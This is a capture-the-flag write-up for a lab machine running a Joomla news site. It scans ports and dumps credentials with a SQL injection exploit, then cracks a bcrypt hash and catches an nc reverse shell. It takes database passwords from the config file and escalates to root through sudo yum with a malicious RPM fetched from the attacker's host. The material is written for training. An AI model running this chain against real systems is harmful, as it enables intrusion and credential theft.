# Open Port Discovery

```bash
$ masscan -p1-65535 10.10.176.1 --rate=1000 -e tun0 --output-format grepable --output-filename daily-bugle.masscan
$ cat daily-bugle.masscan


# Masscan 1.3.2 scan initiated Mon Jul 12 05:07:28 2021
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Timestamp: 1626066483 Host: 10.10.176.1 () Ports: 3306/open/tcp//mysql//
Timestamp: 1626066484 Host: 10.10.176.1 () Ports: 80/open/tcp//http//
Timestamp: 1626066552 Host: 10.10.176.1 () Ports: 22/open/tcp//ssh//
# Masscan done at Mon Jul 12 05:09:50 2021
```

The target is serving SSH, HTTP, and MySQL.

# Open Port Enumeration

## Service Scan

```bash
$ sudo nmap -sC -sV -O -p 22,3306,80 10.10.176.1 -oA daily-bugle


Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 00:12 CDT
Nmap scan report for 10.10.176.1
Host is up (0.097s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.1 (94%), Linux 3.16 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.06 seconds
```

## Port 22 (SSH)
OpenSSH 7.4 + CentOS --> likely `CentOS 7`

## Port 80 (HTTP)
News article web application: *The Daily Bugle*. The content management system powering the application is [Joomla](https://www.joomla.org/).

The web application's `robots.txt`:

![Pasted image 20210712001900](Pasted%20image%2020210712001900.png)

Of these `robots.txt` entries, `/administrator/` is the only path that returns anything useful: an administrator login form.

![Pasted image 20210712002032](Pasted%20image%2020210712002032.png)

Joomla enumeration via `joomscan`

```bash
$ joomscan --url http://10.10.176.1


	--=[OWASP JoomScan
    +---++---==[Version : 0.0.7
	+---++---==[Update Date : [2018/09/23]
	+---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo                   	   --=[Code name : Self Challenge
	@OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.176.1 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.176.1/administrator/components
http://10.10.176.1/administrator/modules
http://10.10.176.1/administrator/templates
http://10.10.176.1/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.176.1/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.176.1/robots.txt 

Interesting path found from robots.txt
http://10.10.176.1/joomla/administrator/
http://10.10.176.1/administrator/
http://10.10.176.1/bin/
http://10.10.176.1/cache/
http://10.10.176.1/cli/
http://10.10.176.1/components/
http://10.10.176.1/includes/
http://10.10.176.1/installation/
http://10.10.176.1/language/
http://10.10.176.1/layouts/
http://10.10.176.1/libraries/
http://10.10.176.1/logs/
http://10.10.176.1/modules/
http://10.10.176.1/plugins/
http://10.10.176.1/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.176.1/
```

The results of `joomscan` indicate `Joomla` version: 3.7.0, which is [potentially vulnerable to SQL injection](https://www.exploit-db.com/exploits/42033).

# Joomla 3.7.0 SQL Injection

## Exploiting the SQL injection vulnerability

Joomla 3.7.0 has a SQL injection vulnerability, which can be leveraged by [this script](https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py) to dump Joomla user credentials.

```bash
$ python2.7 joomblah.py http://10.10.176.1


[-] Fetching CSRF token
 [-] Testing SQLi
('  -  Found table:', 'fb9j5_users')
('  -  Extracting users from', 'fb9j5_users')
(' [$] Found user', ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', ''])
('  -  Extracting sessions from', 'fb9j5_session')
```

This reveals the username `jonah` with email `jonah@tryhackme.com` and `bcrypt` hash `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. If the hash can be cracked, either the Joomla administrator panel or SSH access may be possible.

## Cracking Jonah's hash

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.txt
hashcat -m 3200 jonah.txt /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

The cracked password is `spiderman123`. `jonah`:`spiderman123` grants Joomla administrator access, but not SSH access.

![Pasted image 20210712014717](Pasted%20image%2020210712014717.png)

# Joomla Administrator Access

## Joomla Reverse Shell

Log into the Joomla dashboard at `/administrator/` with `jonah`'s credentials.

[This article](https://www.hackingarticles.in/joomla-reverse-shell/) describes how to obtain a reverse shell. Follow the instructions to receive a reverse shell as the `apache` user in the `/var/www/html` directory.

```bash
$ sudo nc -nlvp 80

listening on [any] 80 ...
connect to [10.6.31.77] from (UNKNOWN) [10.10.134.173] 55132
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

# `apache` Privilege Escalation

## Enumeration

Enumerate the web server directory (`/var/www/html`) for information that could be helpful for privilege escalation.

Joomla configuration file `/var/www/html/configuration.php`:

```php
<?php                                                                                               
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle'; 
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
		public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle'; 
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
		public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database'; 
        public $shared_session = '0';
?>
```

Contains MySQL credentials	`root`:`nv5uz9r3ZEDzVjNu`.

## Credential Reuse

Check for user accounts:

```bash
$ ls /home

jjameson
```

Assuming Jonah Jameson (`jjameson`) is the administrator of the website, attempt to reuse the MySQL password to SSH into the `jjameson` account. Success.

```bash
$ ssh jjameson@10.10.134.173
jjameson@10.10.134.173's password: nv5uz9r3ZEDzVjNu

Last login: Tue Jul 13 01:35:03 2021 from ip-10-6-31-77.eu-west-1.compute.internal
[jjameson@dailybugle ~]$ whoami
jjameson
```

Grab the user flag at `/home/jjameson/user.txt`.

# `jjameson` Privilege Escalation

## Enumeration

```bash
$ sudo -l

Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

`jjameson` can run `yum` on the target as `root`. According to [GTFOBins](https://gtfobins.github.io/gtfobins/yum/), this can be leveraged for privilege escalation by creating a custom RPM that will be executed as `root`.

## Creating the Custom RPM

The custom RPM will copy all files that match the glob pattern `*.txt` in `/root/` to `/dev/shm/`.

On the attacker machine:

```bash
TF=$(mktemp -d)
echo 'cp /root/*.txt /dev/shm' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

Produces `x-1.0-1.noarch.rpm` in the current directory.

## Installing the RPM and obtaining the `root` flag

Transfer `x-1.0-1.noarch.rpm` to the target and install.

On the attacker machine:

```bash
python3 -m http.server 80
```

On the target machine:

```bash
$ wget http://10.6.31.77/x-1.0-1.noarch.rpm                                             

--2021-07-13 01:37:19--  http://10.6.31.77/x-1.0-1.noarch.rpm
Connecting to 10.6.31.77:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6191 (6.0K) [application/x-redhat-package-manager]
Saving to: ‘x-1.0-1.noarch.rpm’
100%[===========================================================================================================================================>] 6,191       --.-K/s   in 0s       
2021-07-13 01:37:20 (22.7 MB/s) - ‘x-1.0-1.noarch.rpm’ saved [6191/6191]
```

```bash
$ sudo yum localinstall -y x-1.0-1.noarch.rpm

Loaded plugins: fastestmirror
Examining x-1.0-1.noarch.rpm: x-1.0-1.noarch
Marking x-1.0-1.noarch.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package x.noarch 0:1.0-1 will be installed
--> Finished Dependency Resolution

Dependencies Resolved

=====================================================================================================================================================================================
 Package                              Arch                                      Version                                     Repository                                          Size
=====================================================================================================================================================================================
Installing:
 x                                    noarch                                    1.0-1                                       /x-1.0-1.noarch                                     24  

Transaction Summary
=====================================================================================================================================================================================
Install  1 Package

Total size: 24  
Installed size: 24  
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : x-1.0-1.noarch                                                                                                                                                    1/1 
  Verifying  : x-1.0-1.noarch                                                                                                                                                    1/1 

Installed:
  x.noarch 0:1.0-1                           

Complete!
```

`root.txt` will be copied into `/dev/shm`.
